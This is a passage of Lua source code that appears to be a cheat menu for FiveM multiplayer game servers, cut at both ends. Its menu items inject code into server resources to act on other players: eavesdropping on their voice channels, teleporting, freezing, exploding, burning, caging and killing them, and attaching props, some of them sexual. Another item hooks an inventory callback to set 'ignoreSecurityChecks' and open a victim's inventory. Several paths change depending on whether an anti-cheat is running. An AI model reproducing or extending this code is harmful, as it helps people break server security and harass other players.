                        },
                        selected = 1,
                        onConfirm = function(data)
                            local modelName = data.value
                            injectCode('monitor', string.format([[
                                local model = GetHashKey('%s')
                                RequestModel(model)
                                while not HasModelLoaded(model) do Wait(0) end
                                SafeRunNative(SetPlayerModel, PlayerId(), model)
                                SetModelAsNoLongerNeeded(model)

                                if model == -1667301416 then
                                    SetPedDefaultComponentVariation(PlayerPedId(), true)
                                end
                            ]], modelName))
                        end
                    },
                    {
                        type = "scroll",
                        label = "Animals",
                        options = {
                            { label = "a_c_boar", value = "a_c_boar" },
                            { label = "a_c_cat_01", value = "a_c_cat_01" },
                            { label = "a_c_chickenhawk", value = "a_c_chickenhawk" },
                            { label = "a_c_chimp", value = "a_c_chimp" },
                            { label = "a_c_chop", value = "a_c_chop" },
                            { label = "a_c_cormorant", value = "a_c_cormorant" },
                            { label = "a_c_cow", value = "a_c_cow" },
                            { label = "a_c_coyote", value = "a_c_coyote" },
                            { label = "a_c_crow", value = "a_c_crow" },
                            { label = "a_c_deer", value = "a_c_deer" },
                            { label = "a_c_dolphin", value = "a_c_dolphin" },
                            { label = "a_c_fish", value = "a_c_fish" },
                            { label = "a_c_hen", value = "a_c_hen" },
                            { label = "a_c_husky", value = "a_c_husky" },
                            { label = "a_c_killerwhale", value = "a_c_killerwhale" },
                            { label = "a_c_mtlion", value = "a_c_mtlion" },
                            { label = "a_c_pig", value = "a_c_pig" },
                            { label = "a_c_pigeon", value = "a_c_pigeon" },
                            { label = "a_c_poodle", value = "a_c_poodle" },
                            { label = "a_c_pug", value = "a_c_pug" },
                            { label = "a_c_rabbit_01", value = "a_c_rabbit_01" },
                            { label = "a_c_rat", value = "a_c_rat" },
                            { label = "a_c_retriever", value = "a_c_retriever" },
                            { label = "a_c_rhesus", value = "a_c_rhesus" },
                            { label = "a_c_rottweiler", value = "a_c_rottweiler" },
                            { label = "a_c_seagull", value = "a_c_seagull" },
                            { label = "a_c_sharkhammer", value = "a_c_sharkhammer" },
                            { label = "a_c_sharktiger", value = "a_c_sharktiger" },
                            { label = "a_c_shepherd", value = "a_c_shepherd" },
                            { label = "a_c_stingray", value = "a_c_stingray" },
                            { label = "a_c_westy", value = "a_c_westy" }
                        },
                        selected = 1,
                        onConfirm = function(data)
                            local modelName = data.value
                            injectCode('monitor', string.format([[
                                local model = GetHashKey('%s')
                                RequestModel(model)
                                while not HasModelLoaded(model) do Wait(0) end
                                SafeRunNative(SetPlayerModel, PlayerId(), model)
                                SetModelAsNoLongerNeeded(model)
                            ]], modelName))
                        end
                    },
                    {
                        label = 'Custom Model',
                        type = 'button',
                        onConfirm = function()
                            showInput('Set player model', '', function(model)
                                if model and model ~= '' then
                                    injectCode('monitor', string.format([[
                                        local model = GetHashKey('%s')
                                        RequestModel(model)
                                        while not HasModelLoaded(model) do Wait(0) end
                                        SafeRunNative(SetPlayerModel, PlayerId(), model)
                                        SetModelAsNoLongerNeeded(model)

                                        if model == -1667301416 or model == 1885233650 then
                                            SetPedDefaultComponentVariation(PlayerPedId(), true)
                                        end
                                    ]], model))
                                end
                            end)
                        end
                    },
                }
            },
        },
    },
    {
        label = 'Online',
        type = 'submenu',
        tabs = {
            {
                name = 'List',
                submenu = onlineListSubmenu
            },
            {
                name = 'Misc',
                submenu = {
                    {
                        type = 'button',
                        label = 'Teleport to Player',
                        onConfirm = function()
                            local serverId = GetSelectedPlayer()

                            if not serverId then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            injectCode('monitor', string.format([[
                                local player = GetPlayerFromServerId(%d)
                                local targetPed = player > 0 and GetPlayerPed(player)

                                if targetPed and targetPed > 0 then
                                    local coords = GetEntityCoords(targetPed)
                                    local selfPed = PlayerPedId()

                                    SafeRunNative(SetEntityCoords, selfPed, coords.x, coords.y, coords.z + 0.0, false, false, false, true)
                                end
                            ]], serverId))
                        end
                    },
                    {
                        type = 'checkbox',
                        label = 'Player Blip',
                        onConfirm = function(checked)
                            local serverId = GetSelectedPlayer()

                            if not serverId then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            injectCode('any', string.format([[
                                local targetID = %d
                                local blip = GetBlipFromEntity(GetPlayerPed(GetPlayerFromServerId(targetID)))
                                if blip and blip > 0 then
                                    SafeRunNative(RemoveBlip, blip)
                                end

                                if %s then
                                    local ped = GetPlayerPed(GetPlayerFromServerId(targetID))
                                    if ped and ped > 0 then
                                        SafeRunNative(AddBlipForEntity, ped)
                                    end
                                end
                            ]], serverId, checked))
                        end
                    },
                    {
                        type = 'checkbox',
                        label = 'Spectate Player',
                        onConfirm = function(checked)
                            local serverId = GetSelectedPlayer()

                            if not serverId then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            if GetResourceState('ReaperV4') == 'started' then
                                injectCode('any', string.format([[
                                    local targetID = %d
                                    local targetPed = GetPlayerPed(GetPlayerFromServerId(targetID))
                                    if not DoesEntityExist(targetPed) then return end
                                    SafeRunNative(NetworkSetInSpectatorMode, %s, targetPed)
                                ]], serverId, checked))
                            else
                                injectCode('any', string.format([[
                                    _G.__SpectateRunning = %s
                                    local tgtPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                    local cam = SafeRunNative(CreateCam, "DEFAULT_SCRIPTED_CAMERA", true)
                                    _G.__SpectateCam = cam

                                    SafeRunNative(SetCamActive, cam, true)
                                    SafeRunNative(RenderScriptCams, true, false, 0, true, false)

                                    local function enableSpectateVoice()
                                        local players = GetActivePlayers()
                                        for i = 1, #players do
                                            local ply = players[i]
                                            local sid = GetPlayerServerId(ply)
                                            if sid ~= GetPlayerServerId(PlayerId()) then
                                                local ch = SafeRunNative(MumbleGetVoiceChannelFromServerId, sid)
                                                if ch ~= -1 then
                                                    SafeRunNative(MumbleAddVoiceChannelListen, ch)
                                                end
                                            end
                                        end
                                    end

                                    enableSpectateVoice()

                                    SafeRunNative(CreateThread, function()
                                        local distanceBehind = 3.0
                                        local baseHeight = 1.0

                                        while _G.__SpectateRunning and tgtPed and DoesEntityExist(tgtPed) do
                                            Wait(1)
                                            local coords = GetEntityCoords(tgtPed)
                                            SafeRunNative(RequestAdditionalCollisionAtCoord, coords.x, coords.y, coords.z)
                                            SafeRunNative(SetFocusPosAndVel, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)

                                            local camRot = GetGameplayCamRot(0)
                                            local pitch = -math.rad(camRot.x)
                                            local heading = math.rad(camRot.z)

                                            local offsetX = -math.sin(heading) * math.cos(pitch) * distanceBehind
                                            local offsetY =  math.cos(heading) * math.cos(pitch) * distanceBehind
                                            local offsetZ =  math.sin(pitch) * distanceBehind

                                            local camX = coords.x + offsetX
                                            local camY = coords.y + offsetY
                                            local camZ = coords.z + baseHeight + offsetZ

                                            SafeRunNative(SetCamCoord, cam, camX, camY, camZ)
                                            SafeRunNative(PointCamAtEntity, cam, tgtPed, 0.0, 0.0, 0.8, true)

                                            tgtPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                        end

                                        SafeRunNative(ClearFocus)
                                        SafeRunNative(RenderScriptCams, false, false, 0, true, false)
                                        SafeRunNative(DestroyCam, cam, false)
                                        _G.__SpectateCam = nil
                                    end)
                                ]], checked, serverId, serverId))
                            end
                        end
                    },
                    {
                        label = 'Copy Outfit',
                        type = 'button',
                        onConfirm = function()
                            local selectedPlayer = GetSelectedPlayer()
                            if not selectedPlayer then
                                showNotify('You must select a player first!', 'error')
                                return
                            end
                            
                            injectCode('monitor', string.format([[
                                local player = GetPlayerFromServerId(%d)
                                local targetPed = player > 0 and GetPlayerPed(player)

                                if targetPed and targetPed > 0 then
                                    local selfPed = PlayerPedId()

                                    SafeRunNative(ClonePedToTarget, targetPed, selfPed)
                                end
                            ]], selectedPlayer))
                        end
                    },
                    {
                        label = 'Bug Player',
                        type = 'button',
                        onConfirm = function()
                            local selectedPlayer = GetSelectedPlayer()
                            if not selectedPlayer then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            if _G.SetClient_RunningBugPlayer then
                                return
                            end

                            _G.SetClient_RunningBugPlayer = true

                            local selfPed = PlayerPedId()
                            local setCoords = GetEntityCoords(selfPed)
                            local setHeading = GetEntityHeading(selfPed)
                            local cachedSelfData = GetCachedSelfData()
                            local runingBugger = true

                            CreateThread(function()
                                while runingBugger do
                                    selfPed = PlayerPedId()

                                    TaskJump(selfPed)
                                    SetEntityVelocity(selfPed, 50.0, 50.0, 50.0)
                                    FreezeEntityPosition(selfPed, true)
                                    SetEntityCoords(selfPed, setCoords.x, setCoords.y, setCoords.z)

                                    Wait(0)
                                end
                            end)

                            CreateThread(function()
                                Wait(0)

                                local serverId = selectedPlayer
                                local player = GetPlayerFromServerId(serverId)
                                local targetPed = player > 0 and GetPlayerPed(player)

                                if targetPed and targetPed > 0 then
                                    local selfPed = PlayerPedId()

                                    if targetPed ~= selfPed then
                                        local targetEntity = GetVehiclePedIsIn(targetPed, false)

                                        if not targetEntity or targetEntity <= 0 then
                                            targetEntity = targetPed
                                        end

                                        -- for l = 1, 3 do
                                            AttachEntityToEntityPhysically(selfPed, targetEntity, 0, 0, 999.0, 999.0, 999.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 999999999, true, true, true, true, 1)

                                            Wait(0)

                                            DetachEntity(selfPed, true, true)

                                            Wait(0)
                                        -- end
                                    end
                                end

                                Wait(0)

                                selfPed = PlayerPedId()

                                runingBugger = false

                                ClearPedTasksImmediately(selfPed)

                                Wait(50)

                                selfPed = PlayerPedId()

                                DetachEntity(selfPed, true, true)
                                FreezeEntityPosition(selfPed, false)

                                SetCurrentSelfData(cachedSelfData)

                                Wait(100)

                                _G.SetClient_RunningBugPlayer = false
                            end)
                        end
                    },
                    {
                        label = 'Launch Player',
                        type = 'button',
                        onConfirm = function()
                            local selectedPlayer = GetSelectedPlayer()
                            if not selectedPlayer then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            injectCode('monitor', string.format([[
                                local player = GetPlayerFromServerId(%d)
                                local targetPed = player > 0 and GetPlayerPed(player)

                                if targetPed and targetPed > 0 then
                                    SafeRunNative(CreateThread, function()
                                        local vehicle = GetNearestVehicle(true)
                                        local spawned = false

                                        if vehicle and vehicle > 0 then
                                            TakeControlOfVehicle(vehicle)
                                        else
                                            local vehicleHash = GetHashKey('adder')

                                            RequestModel(vehicleHash)

                                            local setTimer = GetGameTimer()

                                            while not HasModelLoaded(vehicleHash) do
                                                Wait(0)

                                                if (GetGameTimer() - setTimer) > 5000 then
                                                    return
                                                end
                                            end

                                            local selfCoords = GetEntityCoords(PlayerPedId())

                                            vehicle = SafeRunNative(CreateVehicle, vehicleHash, selfCoords.x, selfCoords.y, selfCoords.z, 0.0, true, false)

                                            SafeRunNative(SetModelAsNoLongerNeeded, vehicleHash)

                                            spawned = true
                                        end

                                        if not vehicle or vehicle <= 0 then
                                            return
                                        end

                                        if spawned then
                                            SafeRunNative(SetEntityInvincible, vehicle, true)
                                            SafeRunNative(SetEntityVisible, vehicle, false)
                                        end

                                        local underCoords = GetOffsetFromEntityInWorldCoords(targetPed, 0.0, 0.0, -1.5)

                                        SetCoords(vehicle, underCoords)
                                        SafeRunNative(FreezeEntityPosition, vehicle, false)
                                        SafeRunNative(SetEntityVelocity, vehicle, 0.0, 0.0, 0.0)
                                        SafeRunNative(ApplyForceToEntity, vehicle, 1, 0.0, 0.0, 250.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                        SafeRunNative(ApplyForceToEntityCenterOfMass, targetPed, 1, 0.0, 0.0, 150.0, false, true, true, false)

                                        if spawned then
                                            Wait(1200)

                                            SafeRunNative(DeleteEntity, vehicle)
                                        end
                                    end)
                                end
                            ]], selectedPlayer))
                        end
                    },
                    {
                        label = 'Fling Player',
                        type = 'button',
                        onConfirm = function()
                            local selectedPlayer = GetSelectedPlayer()
                            if not selectedPlayer then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            injectCode('monitor', string.format([[
                                local player = GetPlayerFromServerId(%d)
                                local targetPed = player > 0 and GetPlayerPed(player)

                                if targetPed and targetPed > 0 then
                                    SafeRunNative(CreateThread, function()
                                        local vehicle = GetNearestVehicle(true)
                                        local spawned = false

                                        if vehicle and vehicle > 0 then
                                            TakeControlOfVehicle(vehicle)
                                        else
                                            local vehicleHash = GetHashKey('adder')

                                            RequestModel(vehicleHash)

                                            local setTimer = GetGameTimer()

                                            while not HasModelLoaded(vehicleHash) do
                                                Wait(0)

                                                if (GetGameTimer() - setTimer) > 5000 then
                                                    return
                                                end
                                            end

                                            local selfCoords = GetEntityCoords(PlayerPedId())

                                            vehicle = SafeRunNative(CreateVehicle, vehicleHash, selfCoords.x, selfCoords.y, selfCoords.z, 0.0, true, false)

                                            SafeRunNative(SetModelAsNoLongerNeeded, vehicleHash)

                                            spawned = true
                                        end

                                        if not vehicle or vehicle <= 0 then
                                            return
                                        end

                                        SafeRunNative(SetEntityInvincible, vehicle, true)
                                        SafeRunNative(SetEntityVisible, vehicle, false)

                                        local underCoords = GetOffsetFromEntityInWorldCoords(targetPed, 0.0, 0.0, -1.5)

                                        SetCoords(vehicle, underCoords)

                                        SafeRunNative(FreezeEntityPosition, vehicle, false)
                                        SafeRunNative(SetEntityVelocity, vehicle, 0.0, 0.0, 0.0)
                                        SafeRunNative(ApplyForceToEntity, vehicle, 1, 0.0, 0.0, 400.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)

                                        Wait(1200)

                                        if spawned then
                                            SafeRunNative(DeleteEntity, vehicle)
                                        end
                                    end)
                                end
                            ]], selectedPlayer))
                        end
                    },
                    {
                        label = 'Crush Player',
                        type = 'button',
                        onConfirm = function()
                            local selectedPlayer = GetSelectedPlayer()
                            if not selectedPlayer then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            injectCode('monitor', string.format([[
                                local player = GetPlayerFromServerId(%d)
                                local targetPed = player > 0 and GetPlayerPed(player)

                                if targetPed and targetPed > 0 then
                                    SafeRunNative(CreateThread, function()
                                        local vehicle = GetNearestVehicle(true)

                                        if vehicle and vehicle > 0 then
                                            TakeControlOfVehicle(vehicle)
                                        else
                                            local vehicleHash = GetHashKey('dump')

                                            RequestModel(vehicleHash)

                                            local setTimer = GetGameTimer()

                                            while not HasModelLoaded(vehicleHash) do
                                                Wait(0)

                                                if (GetGameTimer() - setTimer) > 5000 then
                                                    return
                                                end
                                            end

                                            local selfCoords = GetEntityCoords(PlayerPedId())

                                            vehicle = SafeRunNative(CreateVehicle, vehicleHash, selfCoords.x, selfCoords.y, selfCoords.z, 0.0, true, false)

                                            SafeRunNative(SetModelAsNoLongerNeeded, vehicleHash)
                                        end

                                        if not vehicle or vehicle <= 0 then
                                            return
                                        end

                                        SafeRunNative(SetEntityInvincible, vehicle, true)
                                        SafeRunNative(SetEntityProofs, vehicle, true, true, true, true, true, true, true)
                                        SafeRunNative(FreezeEntityPosition, vehicle, true)

                                        local aboveCoords = GetOffsetFromEntityInWorldCoords(targetPed, 0.0, 0.0, 8.0)

                                        SetCoords(vehicle, aboveCoords)

                                        Wait(50)

                                        SafeRunNative(FreezeEntityPosition, vehicle, false)
                                        SafeRunNative(SetEntityVelocity, vehicle, 0.0, 0.0, -60.0)
                                    end)
                                end
                            ]], selectedPlayer))
                        end
                    },
                    {
                        label = 'Open Player Inventory',
                        type = 'button',
                        onConfirm = function()
                            local selectedPlayer = GetSelectedPlayer()
                            if not selectedPlayer then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            injectCode('ox_inventory',  string.format([[
                                local libCbAwait = _G.lib.callback.await

                                _G.lib.callback.await = function(event, ...)
                                    if event == 'ox_inventory:openInventory' then
                                        local left, right, accessError = libCbAwait(event, ...)

                                        if right then
                                            right.ignoreSecurityChecks = true
                                        end
                                        
                                        return left, right, accessError
                                    else
                                        return libCbAwait(event, ...)
                                    end
                                end
                            
                                client.openInventory('OpenPlayerInventory', %d)

                                _G.lib.callback.await = libCbAwait
                            ]], selectedPlayer))
                        end
                    },
                    {
                        label = 'Teleport Player To Ocean',
                        type = 'button',
                        onConfirm = function()
                            local selectedPlayer = GetSelectedPlayer()
                            if not selectedPlayer then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            injectCode('monitor', string.format([[
                                DeleteTrackedThread('OceanPlayerTeleport')

                                local player = GetPlayerFromServerId(%d)
                                local targetPed = player > 0 and GetPlayerPed(player)

                                if targetPed and targetPed > 0 then
                                    local entity = GetEntityParent()
                                    local originalCoords = GetEntityCoords(entity)
                                    local oceanCoords = vec3(-3072.161621, -2518.033691, 85.118919)

                                    SetCoords(entity, GetEntityCoords(targetPed))
                                    SafeRunNative(ExecuteCommand, 'piggyback')
                                    Wait(500)

                                    CreateTrackedThread('OceanPlayerTeleport', {
                                        thread = function(self)
                                            local stepSize = 13.0
                                            local stepWait = 0

                                            while self.isActive do
                                                local pos = GetEntityCoords(entity)
                                                local delta = oceanCoords - pos
                                                local dist = #delta

                                                if dist <= stepSize then
                                                    SetCoords(entity, oceanCoords)
                                                    break
                                                end

                                                SetCoords(entity, pos + (delta / dist) * stepSize)
                                                Wait(stepWait)
                                            end

                                            if not self.isActive then
                                                return
                                            end

                                            SafeRunNative(ExecuteCommand, 'piggyback')
                                            Wait(500)

                                            if self.isActive then
                                                SetCoords(entity, originalCoords)
                                            end

                                            DeleteTrackedThread('OceanPlayerTeleport')
                                        end,
                                    })
                                end
                            ]], selectedPlayer))
                        end
                    },
                    {
                        type = 'checkbox',
                        label = 'Freeze Player',
                        checked = false,
                        onConfirm = function(checked)
                            if checked then
                                local selectedPlayer = GetSelectedPlayer()
                                if not selectedPlayer then
                                    showNotify('You must select a player first!', 'error')
                                    return
                                end

                                injectCode('monitor', string.format([[
                                    if _G.SetClient_RunningFreezePlayer then return end
                                    _G.SetClient_RunningFreezePlayer = true

                                    SafeRunNative(SetEntityVisible, PlayerPedId(), false, false)

                                    local selfPed = PlayerPedId()
                                    local setCoords = GetEntityCoords(selfPed)
                                    local setHeading = GetEntityHeading(selfPed)
                                    local setVehicle = GetVehiclePedIsIn(selfPed, -1)
                                    local setSeat
                                    setVehicle = setVehicle and setVehicle > 0 and setVehicle
                                    if setVehicle then
                                        for i = -1, GetVehicleModelNumberOfSeats(GetEntityModel(setVehicle)) - 1 do
                                            if GetPedInVehicleSeat(setVehicle, i) == selfPed then
                                                setSeat = i
                                                break
                                            end
                                        end
                                    end

                                    SafeRunNative(CreateThread, function()
                                        local player = GetPlayerFromServerId(%d)
                                        local targetPed = player > 0 and GetPlayerPed(player)
                                        if targetPed and targetPed > 0 then
                                            selfPed = PlayerPedId()
                                            if targetPed ~= selfPed then
                                                local targetEntity = GetVehiclePedIsIn(targetPed, false)
                                                if not targetEntity or targetEntity <= 0 then
                                                    targetEntity = targetPed
                                                end
                                                while _G.SetClient_RunningFreezePlayer do
                                                    SafeRunNative(AttachEntityToEntityPhysically, selfPed, targetEntity, 0, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 999999999, true, true, true, true, 1)
                                                    Wait(0)
                                                end
                                            end
                                        end
                                        selfPed = PlayerPedId()
                                        SafeRunNative(ClearPedTasksImmediately, selfPed)
                                        Wait(50)
                                        SafeRunNative(DetachEntity, selfPed, true, true)
                                        SafeRunNative(FreezeEntityPosition, selfPed, false)
                                        if setVehicle and setSeat and DoesEntityExist(setVehicle) then
                                            SafeRunNative(TaskWarpPedIntoVehicle, selfPed, setVehicle, setSeat)
                                        else
                                            SafeRunNative(SetEntityCoordsNoOffset, selfPed, setCoords.x, setCoords.y, setCoords.z, false, false, true)
                                            SafeRunNative(SetEntityHeading, selfPed, setHeading)
                                        end
                                        Wait(100)
                                    end)
                                ]], selectedPlayer))
                            else
                                injectCode('monitor', [[
                                    _G.SetClient_RunningFreezePlayer = false
                                    SafeRunNative(SetEntityVisible, PlayerPedId(), true, false)
                                ]])
                            end
                        end
                    },
                    {
                        type = 'button',
                        label = 'Explode Player',
                        onConfirm = function()
                            local selectedPlayer = GetSelectedPlayer()
                            if not selectedPlayer then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            injectCode('any', string.format([[
                                local targetID = %d
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(targetID))
                                if DoesEntityExist(targetPed) then
                                    local coords = GetEntityCoords(targetPed) + vec3(0.0, 0.0, 0.2)

                                    ShootBullet('self', GetHashKey('WEAPON_RPG'), coords, coords + vec3(0.0, 0.0, 3.0))
                                end
                            ]], selectedPlayer))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Explode Vehicle',
                        onConfirm = function()
                            local selectedPlayer = GetSelectedPlayer()
                            if not selectedPlayer then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            injectCode('any', string.format([[
                                local targetID = %d
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(targetID))
                                if DoesEntityExist(targetPed) then
                                    local targetVehicle = GetVehiclePedIsIn(targetPed, false)

                                    if not targetVehicle or targetVehicle <= 0 then
                                        ShowNotification('Target is not in a vehicle')
                                        return
                                    end

                                    local coords = GetEntityCoords(targetVehicle)

                                    ShootBullet('self', GetHashKey('WEAPON_RPG'), coords, coords + vec3(0.0, 0.0, 3.0))
                                end
                            ]], selectedPlayer))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Burn Player',
                        onConfirm = function()
                            local selectedPlayer = GetSelectedPlayer()
                            if not selectedPlayer then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            injectCode('any', string.format([[
                                SafeRunNative(CreateThread, function()
                                    for i = 1, 15 do
                                        local targetPed = SafeRunNative(GetPlayerPed, SafeRunNative(GetPlayerFromServerId, %d))
                                        if not SafeRunNative(DoesEntityExist, targetPed) then break end
                                        local coords = SafeRunNative(GetEntityCoords, targetPed)
                                        SafeRunNative(StartScriptFire, coords.x, coords.y, coords.z, 25, false)
                                        Wait(250)
                                    end
                                end)
                            ]], selectedPlayer))
                        end
                    },
                    {
                        label = 'Cage Player',
                        onConfirm = function()
                            local selectedPlayer = GetSelectedPlayer()
                            if not selectedPlayer then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            injectCode('any', string.format([[
                                SafeRunNative(CreateThread, function()
                                    local player = GetPlayerFromServerId(%d)
                                    local targetPed = player > 0 and GetPlayerPed(player)
                                    if not targetPed or not SafeRunNative(DoesEntityExist, targetPed) then return end
                                    local targetCoords = SafeRunNative(GetEntityCoords, targetPed)
                                    local propHash = SafeRunNative(GetHashKey, 'prop_container_05a')
                                    SafeRunNative(RequestModel, propHash)
                                    local timer = SafeRunNative(GetGameTimer)
                                    while not SafeRunNative(HasModelLoaded, propHash) do
                                        Wait(0)
                                        if (SafeRunNative(GetGameTimer) - timer) > 5000 then return end
                                    end
                                    local cage = SafeRunNative(CreateObject, propHash, targetCoords.x, targetCoords.y, targetCoords.z, true, true, true)
                                    SafeRunNative(SetModelAsNoLongerNeeded, propHash)
                                    if cage and cage > 0 then
                                        SafeRunNative(SetEntityAsMissionEntity, cage, true, true)
                                        SafeRunNative(SetEntityHeading, cage, 0.0)
                                        SafeRunNative(FreezeEntityPosition, cage, true)
                                        SafeRunNative(SetEntityInvincible, cage, true)
                                        SafeRunNative(SetEntityCoordsNoOffset, targetPed, targetCoords.x, targetCoords.y, targetCoords.z + 0.5, true, true, true)
                                        SafeRunNative(SetEntityCollision, targetPed, false, false)
                                        Wait(100)
                                        SafeRunNative(SetEntityCollision, targetPed, true, true)
                                    end
                                end)
                            ]], selectedPlayer))
                            showNotify('Caged player', 'success')
                        end
                    },
                    {
                        type = 'scroll',
                        label = 'Dildo Player',
                        selected = 1,
                        options = {
                            { label = 'Normal', value = 'v_res_d_dildo_c' },
                            { label = 'Rainbow Dildo', value = 'v_res_d_dildo_a' },
                            { label = 'BBC', value = 'v_res_d_dildo_f' },
                            { label = 'Blue Dildo', value = 'v_res_d_dildo_b' }
                        },
                        onConfirm = function(data)
                            local selectedPlayer = GetSelectedPlayer()
                            if not selectedPlayer then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            local objectModel = data.value
                            local yOff, zOff = -0.22, -0.32
                            if objectModel == 'v_res_d_dildo_f' then
                                yOff, zOff = -0.30, -0.34
                            end
                            injectCode('any', string.format([[
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                if not targetPed or targetPed <= 0 then return end
                                local modelHash = GetHashKey('%s')
                                RequestModel(modelHash)
                                while not HasModelLoaded(modelHash) do Wait(0) end
                                local coords = GetEntityCoords(targetPed)
                                local obj = SafeRunNative(CreateObject, modelHash, coords.x, coords.y, coords.z, true, true, false)
                                SafeRunNative(AttachEntityToEntity, obj, targetPed, 0, 0.0, %f, %f, -35.0, 0.0, 0.0, false, false, true, false, 0, true)
                            ]], selectedPlayer, objectModel, yOff, zOff))
                        end
                    },
                    {
                        type = 'scroll',
                        label = 'Attach Prop',
                        selected = 1,
                        options = {
                            { label = 'roadcone02a', value = 'prop_roadcone02a' }, { label = 'barrier_work05', value = 'prop_barrier_work05' }, { label = 'bin_05a', value = 'prop_bin_05a' }, { label = 'gnome2', value = 'prop_gnome2' },
                            { label = 'flamingo',    value = 'prop_flamingo' }, { label = 'alien_egg_01', value = 'prop_alien_egg_01' }, { label = 'cactus_01', value = 'prop_cactus_01' }, { label = 'gascyl_01a', value = 'prop_gascyl_01a' },
                            { label = 'weed_01',    value = 'prop_weed_01' }, { label = 'toilet_01', value = 'prop_toilet_01' }, { label = 'dummy_01', value = 'prop_dummy_01' }, { label = 'skid_tent_01', value = 'prop_skid_tent_01' },
                            { label = 'beach_fire', value = 'prop_beach_fire' }, { label = 'ecola_can', value = 'prop_ecola_can' }, { label = 'pizza_box_02', value = 'prop_pizza_box_02' }
                        },
                        onConfirm = function(data)
                            local selectedPlayer = GetSelectedPlayer()
                            if not selectedPlayer then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            local objectModel = data.value
                            injectCode('any', string.format([[
                                local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                local modelHash = GetHashKey('%s')
                                RequestModel(modelHash)
                                while not HasModelLoaded(modelHash) do Wait(0) end
                                local coords = GetEntityCoords(targetPed)
                                local obj = SafeRunNative(CreateObject, modelHash, coords.x, coords.y, coords.z, true, true, false)
                                SafeRunNative(AttachEntityToEntity, obj, targetPed, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                            ]], selectedPlayer, objectModel))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Kill Player',
                        onConfirm = function()
                            local selectedPlayer = GetSelectedPlayer()
                            if not selectedPlayer then
                                showNotify('You must select a player first!', 'error')
                                return
                            end

                            injectCode('any', string.format([[
                                SafeRunNative(CreateThread, function()
                                    local weaponName = 'vehicle_weapon_subcar_mg'
                                    local ammoAmount = 999
                                    local targetSid = %d
                                    local weapon = GetHashKey(weaponName)

                                    RequestWeaponAsset(weapon, 31, 26)
                                    while not HasWeaponAssetLoaded(weapon) do
                                        Wait(0)
                                    end

                                    local selfPed = PlayerPedId()
                                    SafeRunNative(GiveDelayedWeaponToPed, selfPed, weapon, ammoAmount, true)
                                    SafeRunNative(SetPedAmmo, selfPed, weapon, ammoAmount)

                                    local targetPed = GetPlayerPed(GetPlayerFromServerId(targetSid))

                                    if DoesEntityExist(targetPed) and not IsPedDeadOrDying(targetPed, true) then
                                        local targetCoords = GetEntityCoords(targetPed)
                                        local fromCoords = targetCoords + vec3(0.0, 0.0, 0.1)

                                        SafeRunNative(ShootSingleBulletBetweenCoords, fromCoords.x, fromCoords.y, fromCoords.z, targetCoords.x, targetCoords.y, targetCoords.z, 999999, true, weapon, selfPed, true, false, 999999.0)

                                        SafeRunNative(SetPedUsingActionMode, selfPed, true, -1, 1)
                                        SafeRunNative(SetPedCurrentWeaponVisible, selfPed, false, false, true, true)
                                    end

                                    SafeRunNative(SetPedUsingActionMode, selfPed, false, -1, 'DEFAULT_ACTION')
                                    SafeRunNative(RemoveWeaponFromPed, selfPed, weapon)
                                    SafeRunNative(SetCurrentPedWeapon, selfPed, 'weapon_unarmed', true)
                                end)
                            ]], selectedPlayer))
                        end
                    },
                    {
                        type = 'checkbox',
                        label = 'Burn Player',
                        desc = 'Continuously burns the selected player',
                        onConfirm = function(checked)
                            if checked then
                                local selectedPlayer = GetSelectedPlayer()
                                if not selectedPlayer then
                                    showNotify('You must select a player first!', 'error')
                                    return
                                end
                                injectCode('any', string.format([[
                                    _G.BurnPlayerActive = true
                                    _G.BurnPlayerTarget = %d
                                    _G.BurnPlayerLastShot = 0

                                    if not _G.BurnPlayerThread then
                                        _G.BurnPlayerThread = true
                                        SafeRunNative(CreateThread, function()
                                            local fireWeap = SafeRunNative(GetHashKey, 'WEAPON_INCENDIARY_SHOTGUN')
                                            local selfPed  = SafeRunNative(PlayerPedId)

                                            SafeRunNative(Citizen.InvokeNative, 0xBF0FD6E56C964FCB, selfPed, fireWeap, 999, false, true)
                                            SafeRunNative(SetPedAmmo, selfPed, fireWeap, 999)

                                            while _G.BurnPlayerActive do
                                                Wait(0)
                                                if SafeRunNative(GetGameTimer) - (_G.BurnPlayerLastShot or 0) < 1200 then goto cont end

                                                local targetPed = SafeRunNative(GetPlayerPed, SafeRunNative(GetPlayerFromServerId, _G.BurnPlayerTarget))
                                                if not targetPed or targetPed == 0 or not SafeRunNative(DoesEntityExist, targetPed) then goto cont end

                                                _G.BurnPlayerLastShot = SafeRunNative(GetGameTimer)
                                                local c = SafeRunNative(GetEntityCoords, targetPed)
                                                SafeRunNative(ShootSingleBulletBetweenCoords,
                                                    c.x, c.y, c.z + 0.1,
                                                    c.x, c.y, c.z,
                                                    200, true, fireWeap, selfPed, true, false, -1.0
                                                )
                                                SafeRunNative(SetPedCurrentWeaponVisible, selfPed, false, false, true, true)

                                                ::cont::
